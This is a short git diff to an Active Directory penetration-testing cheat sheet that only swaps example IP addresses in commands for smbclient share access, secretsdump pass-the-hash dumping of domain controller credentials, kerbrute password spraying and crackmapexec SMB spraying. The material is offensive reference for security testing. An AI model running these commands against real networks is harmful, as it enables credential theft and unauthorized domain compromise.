@@ -691,8 +691,8 @@ Requirements:
 
 * [smbclient - from Samba, ftp-like client to access SMB/CIFS resources on servers](#)
   ```powershell
-  smbclient -U username //10.0.0.1/SYSVOL
-  smbclient //10.0.0.1/Share
+  smbclient -U username //10.8.213.254/SYSVOL
+  smbclient //10.8.213.254/Share
 
   # Download a folder recursively
   smb: \> mask ""
@@ -974,7 +974,7 @@ secretsdump also works remotely
 
 ```java
 ./secretsdump.py -dc-ip IP AD\administrator@domain -use-vss -pwd-last-set -user-status 
-./secretsdump.py -hashes aad3b435b51404eeaad3b435b51404ee:0f49aab58dd8fb314e268c4c6a65dfc9 -just-dc PENTESTLAB/dc\$@10.0.0.1
+./secretsdump.py -hashes aad3b435b51404eeaad3b435b51404ee:0f49aab58dd8fb314e268c4c6a65dfc9 -just-dc PENTESTLAB/dc\$@10.8.213.254
 ```
 
 * `-pwd-last-set`: Shows pwdLastSet attribute for each NTDS.DIT account.
@@ -1088,7 +1088,7 @@ root@kali:~$ ./kerbrute_linux_amd64 passwordspray -d domain.local --dc 10.10.10.
 Using `crackmapexec` and `mp64` to generate passwords and spray them against SMB services on the network.
 
 ```powershell
-crackmapexec smb 10.0.0.1/24 -u Administrator -p `(./mp64.bin Pass@wor?l?a)`
+crackmapexec smb 10.8.213.254/24 -u Administrator -p `(./mp64.bin Pass@wor?l?a)`
 ```
 
 Using `DomainPasswordSpray` to spray a password against all users of a domain.
